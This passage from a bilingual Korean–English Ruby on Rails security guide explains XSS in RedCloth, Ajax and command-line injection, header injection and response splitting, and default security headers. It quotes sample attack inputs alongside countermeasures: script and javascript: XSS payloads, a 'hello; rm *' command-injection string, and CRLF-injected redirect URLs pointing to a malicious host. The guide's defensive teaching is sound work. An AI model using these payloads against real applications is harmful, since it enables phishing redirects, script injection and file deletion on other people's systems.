예를 드렁, RedCloth는 `_test_` 를 &lt;em&gt;test&lt;em&gt; 로 번역하여 텍스트를 이택릭체로 만들어 줍니다. 그러나, 최근의 3.0.4 버전까지는 여전히 XSS에 취약하다는 것입니다. [완전히 새로운 version 4](http://www.redcloth.org)를 사용하면 이러한 심각한 버그를 피할 수 있습니다. 그러나, 이 버전 조차도 [몇가지 보안 버그](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)를 가지고 있어서 이에 대한 대책을 적용해야 합니다. 아래에 3.0.4 번에 대한 예제 코드가 있습니다. [[[For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:]]]

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

이런 경우 :filter_html 옵션을 사용하면 Textile 프로세서가 만들지 않는 HTML을 제거할 수 있게 됩니다. [[[Use the :filter_html option to remove HTML which was not created by the Textile processor.]]]

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

그러나, 이것도 모든 HTML을 필터하지 못해서 디자인시에 몇가지 태그가 남게 됩니다. 예를 들면, &lt;a&gt; [[[However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:]]]

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### [Countermeasures] 해결책

XSS 섹션의 해결책에 기술한 바와 같이, _화이트리스트 입력 필터와 함께 RedCloth를 사용할 것_ 을 권합니다. [[[It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.]]]

### [Ajax Injection] Ajax 주입

NOTE: _"정상" 액션에서와 같이 Ajax 액션에 대해서도 동일한 보안 조치를 취해야 합니다. 그러나, 적어도 하나의 예외가 있는데, 액션이 뷰를 렌더링하지 않을 경우, 결과물이 컨트롤러에서 이미 이스케이핑되어야 한다는 것입니다._ [[[_The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._]]]

[in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing)을 사용하거나 뷰를 렌더링하는 대신에 문자열을 반환하는 액션을 사용할 때는, _액션에서 반환되는 값을 이스케이핑해야 합니다._ 그렇지 않을 경우, 반환값이 XSS 문자열을 포함하게 되면, 브라우저로 반환될 경우 악성코드가 실행될 것입니다. h() 메소드를 이용하면 모든 입력 값을 이스케이핑할 수 있습니다. [[[If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.]]]

### [Command Line Injection] 커맨드라인 주입

NOTE: _사용자가 지정할 수 있는 커맨드라인 파라미터를 사용할 때는 주의해야 합니다._ [[[_Use user-supplied command line parameters with caution._]]]

어플리케이션이 서버 운영시스템에서 명령을 실행해야 할 경우, 루비에서는 exec(command), syscall(command), system(command), `command` 와 같은 몇가지 메소드를 제공해 줍니다. 사용자가 전체 명령어나 일부를 입력할 수 있도록 허용될 경우 이러한 함수들을 사용할 때 특별히 주의를 해야 할 것입니다. 왜냐하면, 대부분의 쉘에서는, 첫번째 명령 끝에 세미콜론(;)이나 수직바(|) 문자를 이용하여 또 다른 명령을 실행할 수 있기 때문입니다. [[[If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).]]]

_대안으로는 `system(command, parameters)` 메소드를 사용해서 커맨트라인 파라미터를 안정하게 넘겨 주는 것_ 입니다. [[[A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.]]]

```ruby
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```


### [Header Injection] 헤더 주입

WARNING: _HTTP 헤더는 동적으로 생성되기 때문에 어떤 경우에는 사용자의 입력내용이 주입될 수 있습니다. 이것은 잘못된 리디렉션, XSS 또는 HTTP 응답 파싱으로 이어질 수 있습니다._ [[[_HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._]]]

HTTP 요청 헤더는 여러가지를 포함하지만 특히, Referer, User-Agent (client software), Cookie field 항목을 포함합니다. 예를 들어 응답 헤더는 상태코드, 쿠키, 위치(리디렉션 URL) 항목을 가집니다. 이 모든 것은 사용자가 제공해 주는 것이라서 약간의 노력만 기울이면 얼마든지 조작할 수 있습니다. _이러한 헤더 항목들도 역시 이스케이핑을 해 주어야 함을 기억해야 합니다._ 예를 들면 관리자 페이지에 user agent를 표시할 때 입니다. [[[HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.]]]

이외에도, _응답 헤더의 일부를 사용자 입력내용을 근거로 작성할 때는 어떤 작업을 하고 있는지를 아는 것이 중요합니다._ 예를 들어, 사용자가 특정 페이지로 되돌아 가도록 할 때 입니다. 이를 위해서, 주어진 주소로 정확하게 리디렉트하기 위해서 폼 내에 "referer" 필드를 두는 것입니다. [[[Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:]]]

```ruby
redirect_to params[:referer]
```

이와 같이 하면, 레일스가 해당 문자열을 위치 헤더 항목으로 삽입하여 브라우저로 302(리디렉트) 상태코드를 보내게 됩니다. 이 때 악성 사용자가 행하는 최초의 작업은 이와 같습니다. [[[What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:]]]

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

루비와 루비온레일스 2.1.2 버전까지(2.1.2버전은 제외)는 내부 버그로 인해 해커가 아래의 예와 같은 임의의 헤더 필드를 주입할 수 있습니다. [[[And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:]]]

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

"%0d%0a"는 루비에서 개행(CRLF)을 의미하는 "\r\n"에 대한 URL 인코딩 문자라는 것을 주목해야 합니다. 따라서 두번째 예의 결과로 만들어지는 HTTP 헤더는, 두번째 위치 헤더 항목이 첫번째 것을 덮어 쓰기 때문에 아래와 같은 것입니다. [[[Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.]]]

```
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

따라서, _헤더 주입에 대한 공격 매개체는 CRLF 문자를 헤더 필드에 주입하는 것에 근거하게 됩니다._ 그렇다면 잘못된 URL로 리디렉션하므로써 공격자는 어떤 일을 할 수 있을까요? 공격자는 원래 웹사이트와 똑같이 생긴 피싱 사이트로 리디렉트하도록 하여 로그인하도록 요구하게 되고 결과적으로 로그인 정보를 공격자에게 보내게 되는 것입니다. 또는 공격자는 해당 사이트에 브라우저 보안 구멍을 통해서 악성 소프트웨어를 인스톨할 수 있게 될 것입니다. 레일스 2.1.2는 `redirect_to` 메소드에서 헤더의 위치 필드에 대해서 이러한 문자들을 이스케이핑하도록 지원합니다. _사용자의 입력내용을 이용하여 다른 헤더 필드를 작성할 때는 직접 코디을 하도록 해야 합니다._ [[[So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._]]]

#### Response Splitting

If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

```
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._


Default Headers
---------------

Every HTTP response from your Rails application receives the following default security headers.

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}
```

You can configure default headers in `config/application.rb`.

```ruby
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}
```

Or you can remove them.

```ruby
config.action_dispatch.default_headers.clear
```

Here is a list of common headers:

* X-Frame-Options
_'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
* X-XSS-Protection
_'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
* X-Content-Type-Options
_'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
* X-Content-Security-Policy
[A powerful mechanism for controlling which sites certain content types can be loaded from](http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html)
* Access-Control-Allow-Origin
Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
* Strict-Transport-Security
[Used to control if the browser is allowed to only access a site over a secure connection](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)

Environmental Security
----------------------

It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, and your server-side secret, e.g. stored in `config/initializers/secret_token.rb`. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.

Additional Resources
--------------------

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

* The Ruby on Rails security project posts security news regularly: [http://www.rorsecurity.info](http://www.rorsecurity.info)
* Subscribe to the Rails security [mailing list](http://groups.google.com/group/rubyonrails-security)
* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too)
* A [good security blog](http://ha.ckers.org/blog/) including the [Cross-Site scripting Cheat Sheet](http://ha.ckers.org/xss.html)
